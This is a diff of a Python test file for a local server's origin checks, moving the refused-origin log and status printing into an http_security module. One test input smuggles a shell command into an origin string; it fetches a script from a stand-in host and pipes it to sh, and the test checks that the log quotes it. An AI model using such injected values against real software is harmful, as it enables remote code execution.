@@ -12,7 +12,7 @@ from openai import AuthenticationError, OpenAI
 
 from dev.tests.test_server import FakeRuntime, Harness, Plan
 from install import launcher
-from server import server
+from server import http_security, server
 from server.origins import ANY_ORIGIN
 
 # The launcher's parser and the server's, each with the arguments it requires.
@@ -243,7 +243,7 @@ class ServerAccessTests(unittest.TestCase):
         # A page of any other origin is refused before the request is read, a
         # preflight too, and learns nothing. The refusal names the flag, and
         # the server prints it once, as the browser hides it from the page.
-        with mock.patch.object(server, "print_status") as printed:
+        with mock.patch.object(http_security, "print_status") as printed:
             for method, extra in (
                 ("POST", key),
                 ("OPTIONS", {"Access-Control-Request-Method": "POST"}),
@@ -293,14 +293,14 @@ class ServerAccessTests(unittest.TestCase):
                 )
 
     def test_refused_origins_are_logged_once_each_and_bounded(self):
-        log = server.RefusedOriginLog()
+        log = http_security.RefusedOriginLog()
         origins = [f"https://{index}.example" for index in range(log.LIMIT + 5)]
         # An origin is printed cut to 256 characters, and a flag value a shell
         # would run quoted.
         origins[0] = "https://" + "a" * 300 + ".example"
         origins[1] = "http://jan.app$(curl${IFS}evil.sh|sh)"
         flags = [origins[0][:256], f"'{origins[1]}'", *origins[2:]]
-        with mock.patch.object(server, "print_status") as printed:
+        with mock.patch.object(http_security, "print_status") as printed:
             for origin in origins + origins:
                 log.report(origin)
         self.assertEqual(
